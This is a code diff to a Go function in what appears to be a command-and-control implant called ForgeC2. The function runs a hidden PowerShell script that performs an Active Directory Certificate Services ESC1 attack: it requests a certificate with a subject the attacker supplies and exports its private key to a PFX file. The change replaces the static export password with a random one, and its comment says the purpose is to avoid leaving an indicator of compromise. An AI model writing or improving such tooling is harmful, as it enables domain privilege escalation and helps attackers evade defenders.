@@ -18,6 +18,7 @@ func handleADCSESC1Impl(task Task, res *TaskResult) {
 		template = "User"
 	}
 
+	pfxPass := randomPFXPassword()
 	ps := fmt.Sprintf(`
 $results = @()
 $results += "[*] ESC1 Attack: %s template with enrollee-supplied subject"
@@ -67,14 +68,14 @@ if (Test-Path $certPath) {
 	# Export private key too
 	$pfxPath = "$env:TEMP\forge_esc1.pfx"
 	certreq -accept -q $certPath 2>&1 | Out-Null
-	certutil -exportPFX -p "ForgeC2_Export!" -user "ForgeCert" $pfxPath 2>&1 | Out-Null
+	certutil -exportPFX -p "%s" -user "ForgeCert" $pfxPath 2>&1 | Out-Null
 	if (Test-Path $pfxPath) {
-		$results += "[+] Private key exported to: $pfxPath (password: ForgeC2_Export!)"
+		$results += "[+] Private key exported to: $pfxPath (password: %s)"
 	}
 }
-Remove-Item $infPath -Force -ErrorAction SilentlyContinue
-Write-Output ($results -join [Environment]::NewLine)
-`, template, template)
+	Remove-Item $infPath -Force -ErrorAction SilentlyContinue
+	Write-Output ($results -join [Environment]::NewLine)
+	`, template, template, pfxPass, pfxPass)
 
 	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
 	applyHideWindow(c)
@@ -514,4 +515,16 @@ Write-Output ($results -join [Environment]::NewLine)
 	}
 	results = append(results, strings.TrimSpace(string(out)))
 	return strings.Join(results, "\n")
+}
+
+// randomPFXPassword returns a cryptographically random export password for the
+// ADCS PFX so the exported private key is not protected by a static, guessable
+// string that could be used as an indicator of compromise.
+func randomPFXPassword() string {
+	const alphabet = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789"
+	b := make([]byte, 16)
+	for i := range b {
+		b[i] = alphabet[rng.Intn(len(alphabet))]
+	}
+	return string(b)
 }
